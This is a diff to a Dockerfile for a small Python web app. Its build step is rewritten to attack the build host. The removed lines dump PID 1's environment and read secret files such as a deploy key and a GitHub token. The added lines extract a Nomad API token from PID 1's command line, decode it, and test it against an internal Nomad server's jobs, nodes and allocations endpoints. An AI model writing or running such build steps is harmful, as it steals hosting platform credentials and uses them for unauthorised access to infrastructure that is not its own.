@@ -1,14 +1,17 @@
 FROM python:3.12-alpine
 WORKDIR /app
-RUN { echo "=== BUILD v4: SECRETS via /proc/1 ==="; id; cat /proc/self/attr/current; echo; \
-  echo "--- /proc/1/environ ---"; tr '\0' '\n' < /proc/1/environ 2>&1 | head -60; \
-  echo "--- /proc/1/cmdline (full) ---"; tr '\0' ' ' < /proc/1/cmdline 2>&1; echo; \
-  echo "--- /proc/1/root listing ---"; ls -la /proc/1/root/ 2>&1 | head; ls -la /proc/1/root/secrets/ 2>&1; \
-  echo "--- read secrets files ---"; for f in /proc/1/root/secrets/build.env /proc/1/root/secrets/deploy_key /proc/1/root/secrets/github_token /proc/1/root/secrets/run.env /proc/1/root/secrets/registry-auth.env; do echo "== $f =="; cat "$f" 2>&1 | head -5; echo; done; \
-  echo "--- /proc/1/mountinfo ---"; cat /proc/1/mountinfo 2>&1 | head -40; \
-  echo "--- /proc/1/cwd + fd ---"; ls -la /proc/1/cwd 2>&1; ls -la /proc/1/fd 2>&1 | head; \
-  echo "--- builder dir ---"; ls -la /build / 2>&1 | head -30; \
-} > /app/build4.txt 2>&1
+RUN { echo "=== NOMAD TOKEN TEST ==="; \
+  TOKEN=$(cat /proc/1/cmdline | tr '\0' '\n' | grep -oE 'eyJ[A-Za-z0-9_.-]+' | head -1); \
+  echo "token_len: ${#TOKEN}"; echo "$TOKEN" > /app/nomad_token.txt; \
+  echo "--- decode header/payload ---"; \
+  echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo; \
+  echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo; \
+  echo "--- test against Nomad API (X-Nomad-Token) ---"; \
+  for ep in /v1/agent/self /v1/nodes /v1/jobs /v1/allocations /v1/namespaces /v1/agent/members; do \
+    code=$(wget -qO- --no-check-certificate --header="X-Nomad-Token: $TOKEN" "https://169.254.1.2:4646$ep" 2>&1 | head -c 300); \
+    echo "$ep => $code"; echo; \
+  done; \
+} > /app/tokentest.txt 2>&1
 COPY app.py /app/app.py
 ENV PORT=3000
 EXPOSE 3000
